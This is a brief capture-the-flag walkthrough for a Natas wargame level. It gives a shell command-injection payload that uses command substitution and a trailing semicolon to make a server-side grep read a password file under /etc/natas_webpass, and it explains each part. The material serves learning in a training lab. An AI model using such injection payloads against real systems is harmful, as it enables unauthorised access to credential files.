$(cat /etc/natas_webpass/natas10) /etc/natas_webpass/natas10;


copy the above line and paste in the input field. 

How it works
=======================
- what if we pass the search string as the natas10 password and the search file as the natas10 password file.
- For doing that i have given a sub command of "cat /etc/natas_webpass/natas10" this will cat the password
and next is the password file itself. 
- Semicolon at end is to terminate the command and leave any character after it.
- the command that the server will see is "grep -i $(cat /etc/natas_webpass/natas10) /etc/natas_webpass/natas10; dictionary.txt"
